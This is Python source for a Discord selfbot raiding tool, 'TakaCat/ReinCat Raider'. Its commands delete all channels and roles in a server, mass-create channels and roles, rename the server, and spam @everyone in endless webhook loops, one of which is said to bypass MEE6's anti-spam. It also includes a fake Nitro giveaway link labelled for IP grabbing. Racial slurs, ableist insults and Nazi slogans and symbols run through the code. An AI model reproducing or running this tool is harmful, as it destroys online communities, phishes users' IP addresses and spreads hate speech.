from typing import Optional
import discord, pyfiglet
from discord.ext import commands
from discord.utils import get
from time import gmtime, strftime
from discord import Embed, Member
from datetime import datetime
import asyncio
import random
import os
import time
from discord import Webhook
import pylint
import sys
from discord.ext.commands import CommandNotFound
import base64
import webbrowser
import requests 
import threading 
from colorama import Fore


author = "ReinCat and Takaso"


@slayer.command()
async def raiding(ctx):
  if fusion == True:
    try:
      await ctx.message.delete()
    except:
      pass
    embed=discord.Embed(title="**ད﹝Raiding》ཌ**", description=f"""
  ```\n{prefix}spam([arg] Spams a custom argument) 
{prefix}godspam([arg] Spams a custom argument very fast)
{prefix}cancel(Stops the spam) 
{prefix}rolespam(Spam pings all roles) 
{prefix}flood(Floods the chat with nazi texts) 
{prefix}cdel(Deletes all channels in a server) 
{prefix}roledel(Deletes all roles in a server)
{prefix}catto(Spams Catto webhook) 
{prefix}kill(Nukes the server)
{prefix}gspam(Spams and deletes messages)
{prefix}spambypass(Bypasses MEE6's anti-spam)
{prefix}allchannel(Spams a webhook in all channels)
{prefix}emojiflood(Floods the chat with 2000 emojis)
\n```
""", color=000000)
      embed.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/859865030304071680/860919006054449162/IMG_20210703_182240.jpg")
      await ctx.send(embed=embed)
  else:
    await ctx.send("You're not fused.")  

@slayer.command()
async def general(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title="﹝General》", description=f"""
```\n{prefix}nitro([link] use it for IP Grabbing)
{prefix}userinfo(Gets the info of a user)
{prefix}ascii(Makes an ascii of a message)
{prefix}embedtalk(Embed Message say)
{prefix}embedtalk2(say + title) 
{prefix}embedtalk3(say2 + field) 
{prefix}speed(Gets the latency of the selfbot)
{prefix}ccr(ccr [amount] + [name])
{prefix}masspurge(Purges all messages in a chat)
{prefix}server(Gets the server info)
{prefix}idinfo([USER ID] Shows the info of the user ID)
\n```
""", color=000000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/859865030304071680/860919006054449162/IMG_20210703_182240.jpg") 
    await ctx.send(embed=embed)
        

@slayer.command()
async def setup(ctx):
  try:
    await ctx.message.delete()
    await ctx.channel.edit(slowmode_delay=0)
    await ctx.channel.create_webhook(name="TakaCat Raider")
    message = await ctx.send("Done setupping.")
    await asyncio.sleep(3) 
    await message.delete()
  except:
    await ctx.send("Failed setupping.")
    await asyncio.sleep(3) 
    await message.delete()

@slayer.command()
async def embedtalk(ctx, *, arg):
    await ctx.message.delete()
    embed=discord.Embed(description = arg, color=0x000000)
    await ctx.send(embed=embed)
    
@slayer.command()
async def embedtalk2(ctx, arg1, arg2):
    await ctx.message.delete()
    embed=discord.Embed(title = arg1, description = arg2, color=0x000000)
    await ctx.send(embed=embed)
    
@slayer.command()
async def embedtalk3(ctx, arg1, arg2, arg3):
    await ctx.message.delete()
    embed=discord.Embed(title = arg1, color=0x000000)
    embed.add_field(name=arg2, value=arg3)
    await ctx.send(embed=embed)
    
@slayer.command(aliases=["user", "info"])
async def userinfo(ctx, member : discord.Member):
  await ctx.message.delete()
  roles = [role for role in member.roles]
  embed=discord.Embed(title = member.name, description = member.mention, color=0x000000)
  embed.add_field(name = "『ℹ』 ID", value = member.id)
  embed.add_field(name = "\n『ℹ』 Created at:", value = member.created_at)
  embed.add_field(name = "\n『ℹ』 Joined at:", value = member.joined_at)
  embed.add_field(name="『ℹ』 User Name:", value=member.display_name, inline=False)
  embed.add_field(name="『ℹ』 Discriminator:", value=member.discriminator, inline=False)
  embed.add_field(name = f"『ℹ』 Roles: ", value =" ".join([role.mention for role in roles]))
  embed.set_thumbnail(url = member.avatar_url)
  embed.set_footer(icon_url="https://cdn.discordapp.com/attachments/859865030304071680/860921710998978560/IMG_20210703_182240.jpg",text = "Get hacked by TakaCat Raider")
  await ctx.send(embed=embed)
    
@slayer.event
async def on_ready():
    await slayer.change_presence(activity=discord.Streaming(name="Heil TakaCat ꧅꧅𒁎꧅𒀱꧅𒌧𒅃𒈓𒀱𒈓𒈙꧅𒈙𒈙ဪဪV𒀱𒈓𒈙꧅𒅌꧅꧅𒁎꧅𒀱꧅𒌧𒅃꧅꧅꧅ 𒈓𒈙꧅𒀱꧅𒌧𒅃𒈓𒀱𒈓𒈙꧅𒈙𒈙ဪဪV𒀱𒈓𒈙꧅𒅌꧅꧅𒁎꧅𒀱꧅𒌧𒅃꧅꧅꧅", url="https://www.twitch.tv/#"))

@slayer.command()
async def decode(ctx, *, arg = None):
  await ctx.message.delete()
  try:
    if arg == None:
      embed1=discord.Embed(title="Error", description="No Base64 word was added", color=0xff0000)
      await ctx.send(embed=embed1)
    else:
      base64_message = arg
      base64_bytes = base64_message.encode('ascii')
      message_bytes = base64.b64decode(base64_bytes)
      message = message_bytes.decode('ascii')
      embed=discord.Embed(title="Decoded String", description=f"Decoded string: {message}", color=0x800080)
      await ctx.send(embed=embed)
  except discord.Forbidden:
    print("cazzo")
    

@slayer.command()
async def menu(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="**﹝ReinCat Raider》**", description=f"""
```These are the categories of ReinCat Raider\n```
**? 『卐』General**
```\n General Comands list\n```
**? 『卍』Raiding**
```\n Raiding Comands list\n```
""", color=000000)
  embed.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/859865030304071680/860919006054449162/IMG_20210703_182240.jpg")
  await ctx.send(embed=embed)
  
@slayer.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
      embed=discord.Embed(title="**Unknown Command **", description=f"```\nSorry nigger you are retarded if you didn't know {prefix}menu existed \n```",color=000000)
      await ctx.send(embed=embed)
      return
    raise error
  
@slayer.command()
async def speed(ctx):
    await ctx.message.delete()
    embed=discord.Embed(description=(f'```\nThe SelfBot speed is {round(slayer.latency * 1000)}ms\n```'))
    await ctx.send(embed=embed)
  
@slayer.command()
async def token(ctx, *, arg = None):
  await ctx.message.delete()
  try:
    if arg == None:
      embed1=discord.Embed(title="Error", description="No ID was mentioned", color=0xff0000)
      await ctx.send(embed=embed1)
    else:
      sample_string = arg
      sample_string_bytes = sample_string.encode("ascii") 
      base64_bytes = base64.b64encode(sample_string_bytes) 
      base64_string = base64_bytes.decode("ascii")
      embed=discord.Embed(title="Token", description=f"Encoded token: {base64_string}", color=0x87ceeb)
      await ctx.send(embed=embed)
  except discord.Forbidden:
    print("errore")
    
@slayer.command()
async def ascii(ctx, *, arg):
    await ctx.message.delete()
    text = pyfiglet.figlet_format(arg)
    await ctx.send(f'```{text}```')

@slayer.command()
async def rolespam(ctx):
         await ctx.message.delete()
         roles = "\n".join(role.mention for role in ctx.guild.roles)
         while True:
               await ctx.send(roles)
              
      
@slayer.command()
async def nitro(ctx, *, arg):
  await ctx.message.delete()
  embed=discord.Embed(title="Nitro succesfully  generated!", url=(arg), description="Nitro has been generated, click the link above to claim it!", color=0xff69b4)
  embed.set_image(url="https://cdn.discordapp.com/attachments/677241858765881345/817347817973743626/tenor_4.gif")
  await ctx.send(embed=embed)
      

@slayer.command()
async def catto(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  webhook = await ctx.channel.create_webhook(name="Catto")
  while raid:
    await webhook.send(content="Get Raided Niggers @everyone") 

@slayer.command()
async def server(ctx):
    await ctx.message.delete()
    name = str(ctx.guild.name)
    description = str(ctx.guild.description)

    owner = str(ctx.guild.owner)
    id = str(ctx.guild.id)
    region = str(ctx.guild.region)
    memberCount = str(ctx.guild.member_count)

    icon = str(ctx.guild.icon_url)

    embed = discord.Embed(
        title=name + "",
        description=description,
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=icon)
    embed.add_field(name="Owner", value=owner, inline=True)
    embed.add_field(name="Server ID", value=id, inline=True)
    embed.add_field(name="Region", value=region, inline=True)
    embed.add_field(name="Member Count", value=memberCount, inline=True)
    
    await ctx.send(embed=embed)

@slayer.command()
async def rename(ctx):
    try:
        await ctx.guild.edit(name="Nuked by TakaCat | Heil Catto")
    except:
        pass

@slayer.command()
async def cdel(ctx):
    for c in ctx.guild.channels:
        try:
            await c.delete()
        except:
            pass

@slayer.command()
async def channel(ctx):
    for x in range(500):
        guild = ctx.message.guild
        try:
            await guild.create_text_channel("heil TakaCat")
        except:
            pass

@slayer.command()
async def roledel(ctx):
    for roles in list(ctx.guild.roles):
        try:
            await roles.delete()
        except:
            pass

@slayer.command()
async def rolenuke(ctx):
    for x in range(50):
        try:
            await ctx.guild.create_role(name="Nuked by TakaCat")
            print(f"{x} Roles created.")
        except:
            pass


@slayer.command()
async def kill(ctx):
  await ctx.message.delete()
  tasks = [rename(ctx), cdel(ctx), channel(ctx), roledel(ctx), rolenuke(ctx)]
  asyncio.gather(*tasks)

@slayer.command()
async def masspurge(ctx):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=500).filter(
        lambda m: m.author == slayer.user
    ).map(lambda m: m):
        await message.delete()

@slayer.command()
async def gspam(ctx, *, arg):
  global raid
  raid = True
  await ctx.message.delete()
  while raid:
    try:
      await ctx.send(arg, delete_after=0)
    except discord.Forbidden:
      print("cazzo nn va")
      return

@slayer.command()
async def spambypass(ctx):
    global raid
    raid = True
    await ctx.message.delete()
    while raid:
        await ctx.send(f"@everyone {random.randint(0, 9999)}")

@slayer.command()
async def allchannel(ctx):
  for channel in ctx.guild.channels:
    try:
      webhook = await channel.create_webhook(name="TakaCat")
      await webhook.send(content="Raided by TakaCat! @everyone")
      if not webhook:
        embed=discord.Embed(title="Error!", description="No webhooks found", color=0xff0000)
        await ctx.send(embed=embed)
    except discord.Forbidden:
      embed2=discord.Embed(title="Error!", description="Missing permission", color=0xff0000)
      await ctx.send(embed=embed2)
    except:
      pass

@slayer.command()
async def emoji_embed(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  nazi=discord.Embed(title="""
HEIL CATTO
    """, description="""
    😀😃😄😁😆😅😂🤣☺️😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽😹👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲👐🙌👏🤝👍🏼👎👊✊🤛🤜🤞✌️🤟🤘👌🤏👈👉👆👇☝️✋🤚🖐🖖👋🤙💪🦾🖕✍️🙏🦶🦵🦿💄💋👄🦷👅👂🦻👃👣👁👀🧠🗣👤👥👶👧🧒👦👩🧑👨👩‍🦱🧑‍🦱👨‍🦱👩‍🦰🧑‍🦰👨‍🦰👱‍♀️👱👱‍♂️👩‍🦳🧑‍🦳👨‍🦳👩‍🦲🧑‍🦲👨‍🦲🧔👵🧓👴👲👳‍♀️👳👳‍♂️🧕👮‍♀️👮👮‍♂️👷‍♀️👷👷‍♂️💂‍♀️💂💂‍♂️🕵️‍♀️🕵️🕵️‍♂️👩‍⚕️🧑‍⚕️👨‍⚕️👩‍🌾🧑‍🌾👨‍🌾👩‍🍳🧑‍🍳👨‍🍳👩‍🎓🧑‍🎓👨‍🎓👩‍🎤🧑‍🎤👨‍🎤👩‍🏫🧑‍🏫👨‍🏫👩‍🏭🧑‍🏭👨‍🏭👩‍💻🧑‍💻👨‍💻👩‍💼🧑‍💼👨‍💼👩‍🔧🧑‍🔧👨‍🔧👩‍🔬🧑‍🔬👨‍🔬👩‍🎨🧑‍🎨👨‍🎨👩‍🚒🧑‍🚒👨‍🚒👩‍✈️🧑‍✈️👨‍✈️👩‍🚀🧑‍🚀👨‍🚀👩‍⚖️🧑‍⚖️👨‍⚖️👰🤵👸🤴🦸‍♀️🦸🦸‍♂️🦹‍♀️🦹🦹‍♂️🤶🎅🧙‍♀️🧙🧙‍♂️🧝‍♀️🧝🧝‍♂️🧛‍♀️🧛🧛‍♂️🧟‍♀️🧟🧟‍♂️🧞‍♀️🧞🧞‍♂️🧜‍♀️🧜🧜‍♂️🧚‍♀️🧚🧚‍♂️👼🤰🤱🙇‍♀️🙇🙇‍♂️💁‍♀️💁💁‍♂️🙅‍♀️🙅🙅‍♂️🙆‍♀️🙆🙆‍♂️🙋‍♀️🙋🙋‍♂️🧏‍♀️🧏🧏‍♂️🤦‍♀️🤦🤦‍♂️🤷‍♀️🤷🤷‍♂️🙎‍♀️🙎🙎‍♂️🙍‍♀️🙍🙍‍♂️💇‍♀️💇💇‍♂️💆‍♀️💆💆‍♂️🧖‍♀️🧖🧖‍♂️💅🤳💃🕺👯‍♀️👯👯‍♂️🕴👩‍🦽🧑‍🦽👨‍🦽👩‍🦼🧑‍🦼👨‍🦼🚶‍♀️🚶🚶‍♂️👩‍🦯🏃‍♀️👨‍🦯🧎‍♀️🧎🧎‍♂️🏃‍♀️🏃🏃‍♂️🧍‍♀️🧍🧍‍♂️👫👭👬👩‍❤️‍👨👩‍❤️‍👩👨‍❤️‍👨👩‍❤️‍💋‍👨👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨👨‍👩‍👦👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👩‍👩‍👦👩‍👩‍👧👩‍👩‍👧‍👦👩‍👩‍👦‍👦👩‍👩‍👧‍👧👨‍👨‍👦👨‍👨‍👧👨‍👨‍👧‍👦👨‍👨‍👦‍👦👨‍👨‍👧‍👧👩‍👦👩‍👧👩‍👧‍👦👩‍👦‍👦👩‍👧‍👧👨‍👦👨‍👧👨‍👧‍👦👨‍👦‍👦👨‍👧‍👧🧶🧵🧥🥼🦺👚👕👖🩲🩳👔👗👙👘🥻🩱🥿👠👡👢👞👟🥾🧦🧤🧣🎩🧢👒🎓⛑👑💍👝👛👜💼🎒🧳👓🕶🥽🌂🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐽🐸🐵🙈🙉🙊🐒🐔🐧🐦🐤🐣🐥🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🕷🕸🦂🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🦮🐕‍🦺🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔🐾🐉🐲🌵🎄🌲🌳🌴🌱🌿☘️🍀🎍🎋🍃🍂🍁🍄🐚🌾💐🌷🌹🥀🌺🌸🌼🌻🌞🌝🌛🌜🌚🌕🌖🌗🌘🌑🌒🌓🌔🌙🌎🌍🌏🪐💫⭐️🌟✨⚡️☄️💥🔥🌪🌈☀️🌤⛅️🌥☁️🌦🌧⛈🌩🌨❄️☃️⛄️🌬💨💧💦☔️☂️🌊🌫🍏🍎🍐🍊🍋🍌🍉🍇🍓🍈🍒🍑🥭🍍🥥🥝🍅🍆🥑🥦🥬🥒🌶🌽🥕🧄🧅🥔🍠🥐🥯🍞🥖🥨🧀🥚🍳🧈🥞🧇🥓🥩🍗🍖🦴🌭🍔🍟🍕🥪🥙🧆🌮🌯🥗🥘🥫🍝🍜🍲🍛🍣🍱🥟🦪🍤🍙🍚🍘🍥🥠
   """, color=0X7E49D3)
  while raid:
    await ctx.send("RAIDED BY TAKACAT @everyone", embed=nazi) 
